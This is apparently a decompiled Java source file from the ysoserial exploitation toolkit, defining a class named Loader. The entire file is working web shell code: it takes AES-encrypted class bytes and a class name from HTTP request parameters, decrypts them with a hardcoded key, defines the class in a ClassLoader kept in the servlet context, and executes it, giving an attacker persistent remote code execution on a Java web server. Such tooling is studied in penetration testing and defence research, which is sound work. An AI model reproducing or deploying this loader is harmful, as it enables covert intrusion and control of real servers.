package ysoserial.payloads.util;

import java.io.OutputStream;
import java.io.PrintStream;
import java.util.HashMap;
import java.util.Map;
import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.ServletContext;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.jsp.PageContext;
import javax.xml.bind.DatatypeConverter;

public class Loader extends ClassLoader {
   public static Map m = new HashMap();
   String key;
   private OutputStream out;

   public Loader() {
      this(m.getClass().getClassLoader());
   }

   protected Class findClass(String var1) throws ClassNotFoundException {
      Class var2 = (Class)m.get(var1);
      if (var2 == null) {
         var2 = super.findClass(var1);
      }

      return var2;
   }

   public Loader(ClassLoader var1) {
      super(var1);
      this.key = new String(new byte[]{37, 84, 74, 72, 71, 60, 62, 63, 90, 45, 41, 57, 56, 38, 94, 53});
   }

   public Class g(String var1, byte[] var2) {
      Class var3 = (Class)m.get(var1);
      if (var3 == null) {
         var3 = super.defineClass(var1, var2, 0, var2.length);
         m.put(var1, var3);
      }

      return var3;
   }

   public byte[] Decrypt(String var1) {
      try {
         String var2 = this.key;
         byte[] var3 = var2.getBytes("utf-8");
         SecretKeySpec var4 = new SecretKeySpec(var3, "AES");
         Cipher var5 = Cipher.getInstance("AES/CFB8/NoPadding");
         IvParameterSpec var6 = new IvParameterSpec(var3);
         var5.init(2, var4, var6);
         byte[] var7 = DatatypeConverter.parseBase64Binary(var1);
         byte[] var8 = var5.doFinal(var7);
         return var8;
      } catch (Exception var9) {
         this.log(var9);
         return null;
      }
   }

   private void log(Exception var1) {
      if (this.out != null) {
         var1.printStackTrace(new PrintStream(this.out));
      }

   }

   public boolean equals(Object var1) {
      if (var1 instanceof PageContext) {
         try {
            PageContext var2 = (PageContext)var1;
            this.out = var2.getResponse().getOutputStream();
            HttpServletRequest var3 = (HttpServletRequest)var2.getRequest();
            ServletContext var4 = var2.getServletContext();
            String var5 = var3.getParameter("_c");
            String var6 = var3.getParameter("_cn");
            String var7 = "_x3_ld_";
            Object var8 = var4.getAttribute(var7);
            if (var8 == null) {
               var4.setAttribute(var7, var8 = new Loader(var2.getClass().getClassLoader()));
            }

            if (var5 != null && var6 != null) {
               ((Class)var8.getClass().getMethod("g", String.class, byte[].class).invoke(var8, var6, this.Decrypt(var5))).newInstance().equals(var1);
            }
         } catch (Exception var9) {
            this.log(var9);
         }
      }

      return true;
   }
}
